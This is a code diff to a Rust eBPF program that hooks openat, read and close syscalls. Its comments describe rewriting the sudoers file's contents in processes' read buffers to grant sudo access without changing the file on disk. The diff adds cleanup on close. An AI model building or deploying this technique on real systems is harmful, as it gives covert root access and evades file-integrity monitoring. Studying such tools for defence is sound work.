@@ -60,6 +60,14 @@ pub fn handle_read_exit(ctx: TracePointContext) -> u32 {
     }
 }
 
+#[tracepoint]
+pub fn handle_close_exit(ctx: TracePointContext) -> u32 {
+    match handle_close_exit_function(ctx) {
+        Ok(ret) => ret,
+        Err(ret) => ret,
+    }
+}
+
 fn hanle_openat_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
     // If filtering by UID check that
     if unsafe { uid != 0 } {
@@ -140,7 +148,6 @@ fn handle_openat_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
 fn handle_read_enter_function(ctx: TracePointContext) -> Result<u32, u32> {
     // Check this open call is opening our target file
     let pid_tgid = bpf_get_current_pid_tgid();
-    let pid = (pid_tgid >> 32) as u32;
     let pfd = unsafe { map_fds.get(&pid_tgid) };
     if pfd.is_none() {
         return Ok(0);
@@ -202,6 +209,9 @@ fn handle_read_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
     // then add '#'s to comment out rest of data in the chunk.
     // This method corrupts the sudoers file, but everything still
     // works as expected
+    //
+    // it is just be written in the read_buf of memory,
+    // So it is not modify the real file.
     let mut local_buff: [u8; MAX_PAYLOAD_LEN] = [0; MAX_PAYLOAD_LEN];
 
     unsafe {
@@ -233,6 +243,20 @@ fn handle_read_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
         return Ok(0);
     }
 
+    Ok(0)
+}
+
+fn handle_close_exit_function(ctx: TracePointContext) -> Result<u32, u32> {
+    // Check if we're a process thread of interest
+    // deal with the aftermath of this program
+    let pid_tgid = bpf_get_current_pid_tgid();
+    let check = unsafe { map_fds.get(&pid_tgid) };
+    if check.is_none() {
+        return Ok(0);
+    }
+
+    let _ = map_fds.remove(&pid_tgid);
+    let _ = map_buff_addrs.remove(&pid_tgid);
     Ok(0)
 }
 
